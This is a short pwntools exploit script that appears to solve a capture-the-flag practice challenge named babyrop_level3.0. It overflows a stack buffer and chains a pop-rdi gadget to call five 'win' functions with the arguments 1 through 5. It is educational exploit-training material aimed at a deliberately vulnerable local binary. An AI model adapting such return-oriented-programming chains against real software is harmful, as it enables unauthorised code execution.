from pwn import *

win1 = 0x401e30
win2 = 0x4021b7
win3 = 0x401f0c
win4 = 0x4020d1
win5 = 0x401fee
pop_rdi = 0x4025a3
r = process('/challenge/babyrop_level3.0')

payload = b'\x00'*0x48
payload +=  p64(pop_rdi) + p64(1) + p64(win1)
payload +=  p64(pop_rdi) + p64(2) + p64(win2)
payload +=  p64(pop_rdi) + p64(3) + p64(win3)
payload +=  p64(pop_rdi) + p64(4) + p64(win4)
payload +=  p64(pop_rdi) + p64(5) + p64(win5)
r.send(payload)

r.interactive()